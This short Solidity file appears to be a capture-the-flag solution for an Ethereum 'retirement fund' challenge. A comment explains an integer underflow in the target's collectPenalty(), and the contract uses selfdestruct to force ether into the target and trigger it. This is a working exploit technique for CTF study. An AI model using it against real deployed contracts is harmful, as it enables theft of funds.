pragma solidity ^0.4.21;

/**
 * The issue is in collectPenalty() when we calculate the withdrawn value `startBalance - address(this).balance`
 * We can have an underflow if address(this).balance is greater than startBalance causing withdrawn to be greater than 0
 * So we just need to find a way to send additional ether to the contract
 * but no payable functions is available and the contract doesn't implement `function() payable {}`
 * Another way to send ether is by using selfdestruct()
 */
contract SolutionRetirementFund {
    function SolutionRetirementFund(address targetAddress) public payable {
        require(msg.value > 0);
        selfdestruct(targetAddress);
    }
}
